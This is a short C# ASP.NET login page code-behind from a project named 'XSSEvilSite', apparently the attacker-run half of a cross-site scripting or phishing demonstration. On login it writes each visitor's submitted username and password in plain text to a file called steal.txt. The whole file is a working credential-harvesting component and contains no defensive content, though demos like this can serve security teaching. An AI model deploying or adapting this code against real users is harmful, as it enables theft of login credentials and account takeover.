using System;
using System.IO;
using System.Web.UI;

namespace XSSEvilSite
{
    public partial class Login : Page
    {
        protected void Page_Load(object sender, EventArgs e)
        {
        }

        protected void btnLogin_Click(object sender, EventArgs e)
        {
            string line = string.Format("user:{0}, pass:{1}", UserName.Text, Password.Text);
            string path = Server.MapPath(@"~\App_Data\steal.txt");
            File.AppendAllLines(path, new[] { line });
        }
    }
}